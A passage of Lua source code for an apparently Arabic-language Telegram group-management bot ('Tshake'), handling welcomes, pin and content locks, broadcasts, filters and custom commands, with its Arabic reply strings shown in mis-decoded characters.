database:sadd(bot_id.."Tshake:Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
local status_welcome = database:get(bot_id.."Tshake:Chek:Welcome"..msg.chat_id_)
if status_welcome and not database:get(bot_id.."Tshake:Lock:tagservr"..msg.chat_id_) then
if msg.content_.ID == "MessageChatJoinByLink" then
tdcli_function({ID = "GetUser",user_id_=msg.sender_user_id_},function(extra,result) 
local GetWelcomeGroup = database:get(bot_id.."Tshake:Get:Welcome:Group"..msg.chat_id_)  
if GetWelcomeGroup then 
t = GetWelcomeGroup
else  
t = "\nβ’ ΩΩΨ±Ψͺ Ψ­Ψ¨Ω \nβ’  name \nβ’ user" 
end 
t = t:gsub("name",result.first_name_) 
t = t:gsub("user",("@"..result.username_ or "ΩΨ§ ΩΩΨ¬Ψ―")) 
send(msg.chat_id_, msg.id_,t)
end,nil) 
end 
end 
-------------------------------------------------------
if msg.content_.ID == "MessagePinMessage" then
if Constructor(msg) or tonumber(msg.sender_user_id_) == tonumber(bot_id) then 
database:set(bot_id.."Tshake:Pin:Id:Msg"..msg.chat_id_,msg.content_.message_id_)
else
local Msg_Pin = database:get(bot_id.."Tshake:Pin:Id:Msg"..msg.chat_id_)
if Msg_Pin and database:get(bot_id.."Tshake:lockpin"..msg.chat_id_) then
PinMessage(msg.chat_id_,Msg_Pin)
end
end
end
------------------------------------------------------
if msg.content_.photo_ then  
if database:get(bot_id.."Tshake:Change:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_) then 
if msg.content_.photo_.sizes_[3] then  
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_ 
else 
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_ 
end 
tdcli_function ({ID = "ChangeChatPhoto",chat_id_ = msg.chat_id_,photo_ = getInputFile(photo_id) }, function(arg,data)   
if data.code_ == 3 then
send(msg.chat_id_, msg.id_,"πβΏΨΉΨ°Ψ±Ψ§ Ψ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ ΩΨ§ΩΩΨ­Ψ§ΩΩΩ ΩΨ§Ψ­ΩΨ§") 
database:del(bot_id.."Tshake:Change:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_) 
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,"πβΏΩΩΨ³ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© ΨͺΨΊΩΩΨ± ΩΨΉΩΩΩΨ§Ψͺ Ψ§ΩΩΨ¬ΩΩΨΉΩ ΩΨ±Ψ¬Ω Ψ§ΩΩΨ­Ψ§ΩΩΩ ΩΨ§Ψ­ΩΨ§") 
database:del(bot_id.."Tshake:Change:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_) 
else
send(msg.chat_id_, msg.id_,"π βΏΨͺΩ ΨͺΨΊΩΩΨ± Ψ΅ΩΨ±Ψ© Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
end
end, nil) 
database:del(bot_id.."Tshake:Change:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_) 
end   
end
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Tshake:Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text == "Ψ§ΩΨΊΨ§Ψ‘" then 
send(msg.chat_id_, msg.id_,"β«οΈβΏΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΩΨΆΨΉ Ψ§ΩΩΨ΅Ω") 
database:del(bot_id.."Tshake:Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)
return false  
end 
database:del(bot_id.."Tshake:Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
https.request("https://api.telegram.org/bot"..token.."/setChatDescription?chat_id="..msg.chat_id_.."&description="..text) 
send(msg.chat_id_, msg.id_,"π βΏΨͺΩ ΨͺΨΊΩΩΨ± ΩΨ΅Ω Ψ§ΩΩΨ¬ΩΩΨΉΩ")   
return false  
end 
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Tshake:Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text == "Ψ§ΩΨΊΨ§Ψ‘" then 
send(msg.chat_id_, msg.id_,"β«οΈβΏΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΩΨΈ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨") 
database:del(bot_id.."Tshake:Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."Tshake:Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
database:set(bot_id.."Tshake:Get:Welcome:Group"..msg.chat_id_,text) 
send(msg.chat_id_, msg.id_,"π βΏΨͺΩ Ψ­ΩΨΈ ΨͺΨ±Ψ­ΩΨ¨ Ψ§ΩΩΨ¬ΩΩΨΉΩ")   
return false   
end
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Tshake:Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) then
if text == "Ψ§ΩΨΊΨ§Ψ‘" then
send(msg.chat_id_,msg.id_,"π βΏΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΩΨΈ Ψ§ΩΨ±Ψ§Ψ¨Ψ·")       
database:del(bot_id.."Tshake:Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) 
return false
end
if text and text:match("(https://telegram.me/joinchat/%S+)") or text and text:match("(https://t.me/joinchat/%S+)") then     
local Link = text:match("(https://telegram.me/joinchat/%S+)") or text:match("(https://t.me/joinchat/%S+)")   
database:set(bot_id.."Tshake:Private:Group:Link"..msg.chat_id_,Link)
send(msg.chat_id_,msg.id_,"π βΏΨͺΩ Ψ­ΩΨΈ Ψ§ΩΨ±Ψ§Ψ¨Ψ· Ψ¨ΩΨ¬Ψ§Ψ­")       
database:del(bot_id.."Tshake:Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) 
return false 
end
end 

if database:get(bot_id.."Tshake:Tshake:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "Ψ§ΩΨΊΨ§Ψ‘" or text == "Ψ§ΩΨΊΨ§Ψ‘ β" then   
send(msg.chat_id_, msg.id_,"β«οΈβΏΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ ΩΩΨ?Ψ§Ψ΅") 
database:del(bot_id.."Tshake:Tshake:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = database:smembers(bot_id..'Tshake:UsersBot')  
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,"["..msg.content_.text_.."]")  
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, photo,(msg.content_.caption_ or ""))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ""))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
send(msg.chat_id_, msg.id_,"π βΏΨͺΩΨͺ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ Ψ§ΩΩ *~ "..#list.." ~* ΩΨ΄ΨͺΨ±Ω ΩΩ Ψ§ΩΨ?Ψ§Ψ΅ ")     
database:del(bot_id.."Tshake:Tshake:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end

if database:get(bot_id.."Tshake:Tshake:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "Ψ§ΩΨΊΨ§Ψ‘" or text == "Ψ§ΩΨΊΨ§Ψ‘ β" then   
send(msg.chat_id_, msg.id_,"β«οΈβΏΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ") 
database:del(bot_id.."Tshake:Tshake:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = database:smembers(bot_id.."Tshake:Chek:Groups") 
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,"["..msg.content_.text_.."]")  
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, photo,(msg.content_.caption_ or ""))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ""))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
send(msg.chat_id_, msg.id_,"π βΏΨͺΩΨͺ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ Ψ§ΩΩ *~ "..#list.." ~* ΩΨ¬ΩΩΨΉΩ ")     
database:del(bot_id.."Tshake:Tshake:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end

if database:get(bot_id.."Tshake:Tshake:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "Ψ§ΩΨΊΨ§Ψ‘" or text == "Ψ§ΩΨΊΨ§Ψ‘ β" then   
send(msg.chat_id_, msg.id_,"β«οΈβΏΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ") 
database:del(bot_id.."Tshake:Tshake:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
if msg.forward_info_ then 
local list = database:smembers(bot_id.."Tshake:Chek:Groups")   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
send(msg.chat_id_, msg.id_,"π βΏΨͺΩΨͺ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ Ψ§ΩΩ *~ "..#list.." ~* ΩΨ¬ΩΩΨΉΩ ")     
database:del(bot_id.."Tshake:Tshake:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
return false
end
if database:get(bot_id.."Tshake:Tshake:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "Ψ§ΩΨΊΨ§Ψ‘" or text == "Ψ§ΩΨΊΨ§Ψ‘ β" then   
send(msg.chat_id_, msg.id_,"β«οΈβΏΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ") 
database:del(bot_id.."Tshake:Tshake:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
if msg.forward_info_ then 
local list = database:smembers(bot_id.."Tshake:UsersBot")   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
send(msg.chat_id_, msg.id_,"π βΏΨͺΩΨͺ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ Ψ§ΩΩ *~ "..#list.." ~* ΩΨ΄ΨͺΨ±Ω ΩΩ Ψ§ΩΨ?Ψ§Ψ΅ ")     
database:del(bot_id.."Tshake:Tshake:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
return false
end

--------------------------------------------------------------------------------------------------------------
if text and not Vips(msg) then  
local Tshake_Msg = database:get(bot_id.."Tshake:Add:Filter:Rp2"..text..msg.chat_id_)   
if Tshake_Msg then    
Reply_Status(msg,msg.sender_user_id_,"reply","πβΏ"..Tshake_Msg)  
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end
end
if database:get(bot_id.."Tshake:Set:Name:Bot"..msg.sender_user_id_) then 
if text == "Ψ§ΩΨΊΨ§Ψ‘" or text == "Ψ§ΩΨΊΨ§Ψ‘ β" then   
send(msg.chat_id_, msg.id_,"β«οΈβΏ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΩΨΈ Ψ§Ψ³Ω Ψ§ΩΨ¨ΩΨͺ") 
database:del(bot_id.."Tshake:Set:Name:Bot"..msg.sender_user_id_) 
return false  
end 
database:del(bot_id.."Tshake:Set:Name:Bot"..msg.sender_user_id_) 
database:set(bot_id.."Tshake:Name:Bot",text) 
send(msg.chat_id_, msg.id_, "π βΏ ΨͺΩ Ψ­ΩΨΈ Ψ§Ψ³Ω Ψ§ΩΨ¨ΩΨͺ")  
return false
end 
if text and database:get(bot_id.."Tshake:Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
database:set(bot_id.."Tshake:Set:Cmd:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,"π‘βΏΨ§Ψ±Ψ³Ω Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ¬Ψ―ΩΨ―")  
database:del(bot_id.."Tshake:Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
database:set(bot_id.."Tshake:Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and database:get(bot_id.."Tshake:Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = database:get(bot_id.."Tshake:Set:Cmd:Group:New"..msg.chat_id_)
database:set(bot_id.."Tshake:Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
database:sadd(bot_id.."Tshake:List:Cmd:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,"π‘βΏΨͺΩ Ψ­ΩΨΈ Ψ§ΩΨ§ΩΨ±")  
database:del(bot_id.."Tshake:Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' then
if ChekAdd(msg.chat_id_) == true then
if text == "ΩΩΩ Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω" and msg.reply_to_message_id_ == 0 and Owner(msg) then 
database:set(bot_id.."Tshake:Lock:text"..msg.chat_id_,true) 
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ§ΨΆΨ§ΩΩ" and msg.reply_to_message_id_ == 0 and Addictive(msg) then 
database:set(bot_id.."Tshake:Lock:AddMempar"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΨΆΨ§ΩΨ© Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ―Ψ?ΩΩ" and msg.reply_to_message_id_ == 0 and Addictive(msg) then 
database:set(bot_id.."Tshake:Lock:Join"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏΨͺΩ ΩΩΩΩ Ψ―Ψ?ΩΩ Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ" and msg.reply_to_message_id_ == 0 and Addictive(msg) then 
database:set(bot_id.."Tshake:Lock:Bot:kick"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and msg.reply_to_message_id_ == 0 and Addictive(msg) then 
database:set(bot_id.."Tshake:Lock:Bot:kick"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ" and msg.reply_to_message_id_ == 0 and Addictive(msg) then  
database:set(bot_id.."Tshake:Lock:tagservr"..msg.chat_id_,true)  
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ" and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:set(bot_id.."Tshake:lockpin"..msg.chat_id_, true) 
database:sadd(bot_id.."Tshake:Lock:pin",msg.chat_id_) 
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data)  database:set(bot_id.."Tshake:Pin:Id:Msg"..msg.chat_id_,data.pinned_message_id_)  end,nil)
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ ΩΩΨ§")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨͺΨΉΨ―ΩΩ" and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:set(bot_id.."Tshake:Lock:edit"..msg.chat_id_,true) 
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏΨͺΩ ΩΩΩΩ ΨͺΨΉΨ―ΩΩ")  
return false
end 
if text == "ΩΩΩ ΨͺΨΉΨ―ΩΩ Ψ§ΩΩΩΨ―ΩΨ§" and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:set(bot_id.."Tshake:Lock:edit"..msg.chat_id_,true) 
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏΨͺΩ ΩΩΩΩ ΨͺΨΉΨ―ΩΩ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩ" and msg.reply_to_message_id_ == 0 and Constructor(msg) then  
database:set(bot_id.."Tshake:Lock:tagservrbot"..msg.chat_id_,true)   
list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..'Tshake:'..lock..msg.chat_id_,"del")    
end
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏΨͺΩ ΩΩΩΩ Ψ¬ΩΩΨΉ Ψ§ΩΨ§ΩΨ§ΩΨ±")  
return false
end 


--------------------------------------------------------------------------------------------------------------
if text == "ΩΨͺΨ­ Ψ§ΩΨ§ΨΆΨ§ΩΩ" and msg.reply_to_message_id_ == 0 and Addictive(msg) then 
database:del(bot_id.."Tshake:Lock:AddMempar"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","ποΈβΏΨͺΩ ΩΨͺΨ­ Ψ§ΨΆΨ§ΩΨ© Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘")  
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω" and msg.reply_to_message_id_ == 0 and Owner(msg) then 
database:del(bot_id.."Tshake:Lock:text"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","ποΈβΏΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω")  
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨ―Ψ?ΩΩ" and msg.reply_to_message_id_ == 0 and Addictive(msg) then 
database:del(bot_id.."Tshake:Lock:Join"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","ποΈβΏΨͺΩ ΩΨͺΨ­ Ψ―Ψ?ΩΩ Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘")  
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ" and msg.reply_to_message_id_ == 0 and Addictive(msg) then 
database:del(bot_id.."Tshake:Lock:Bot:kick"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","ποΈβΏΨͺΩ ΩΩΨͺΨ­ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ")  
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ " and msg.reply_to_message_id_ == 0 and Addictive(msg) then 
database:del(bot_id.."Tshake:Lock:Bot:kick"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","π\nποΈβΏΨͺΩ ΩΩΨͺΨ­ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ")  
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ" and msg.reply_to_message_id_ == 0 and Addictive(msg) then  
database:del(bot_id.."Tshake:Lock:tagservr"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","ποΈβΏΨͺΩ ΩΩΨͺΨ­ Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ")  
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ" and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:del(bot_id.."Tshake:lockpin"..msg.chat_id_)  
database:srem(bot_id.."Tshake:Lock:pin",msg.chat_id_)
Reply_Status(msg,msg.sender_user_id_,"unlock","ποΈβΏΨͺΩ ΩΩΨͺΨ­ Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ ΩΩΨ§")  
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨͺΨΉΨ―ΩΩ" and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:del(bot_id.."Tshake:Lock:edit"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","ποΈβΏΨͺΩ ΩΩΨͺΨ­ ΨͺΨΉΨ―ΩΩ")  
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨͺΨΉΨ―ΩΩ Ψ§ΩΩΩΨ―ΩΨ§" and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:del(bot_id.."Tshake:Lock:edit"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","ποΈβΏΨͺΩ ΩΩΨͺΨ­ ΨͺΨΉΨ―ΩΩ")  
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΩΩ" and msg.reply_to_message_id_ == 0 and Addictive(msg) then 
database:del(bot_id.."Tshake:Lock:tagservrbot"..msg.chat_id_)   
list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
for i,lock in pairs(list) do 
database:del(bot_id..'Tshake:'..lock..msg.chat_id_)    
end
Reply_Status(msg,msg.sender_user_id_,"unlock","ποΈβΏΨͺΩ ΩΩΨͺΨ­ Ψ¬ΩΩΨΉ Ψ§ΩΨ§ΩΨ§ΩΨ±")  
return false
end 
--------------------------------------------------------------------------------------------------------------
if text == "ΩΩΩ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Link"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ· Ψ¨Ψ§ΩΨͺΩΩΨ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Link"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ· Ψ¨Ψ§ΩΩΨͺΩ" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Link"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ· Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Link"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·")  
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·" and Addictive(msg) then
database:del(bot_id.."Tshake:Lock:Link"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","ποΈβΏΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:User:Name"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ Ψ¨Ψ§ΩΨͺΩΩΨ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:User:Name"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ Ψ¨Ψ§ΩΩΨͺΩ" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:User:Name"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:User:Name"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ")  
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ" and Addictive(msg) then
database:del(bot_id.."Tshake:Lock:User:Name"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","ποΈβΏΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨͺΨ§Ω" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:hashtak"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨͺΨ§Ω")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨͺΨ§Ω Ψ¨Ψ§ΩΨͺΩΩΨ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:hashtak"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨͺΨ§Ω")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨͺΨ§Ω Ψ¨Ψ§ΩΩΨͺΩ" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:hashtak"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨͺΨ§Ω")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨͺΨ§Ω Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:hashtak"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨͺΨ§Ω")  
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨͺΨ§Ω" and Addictive(msg) then
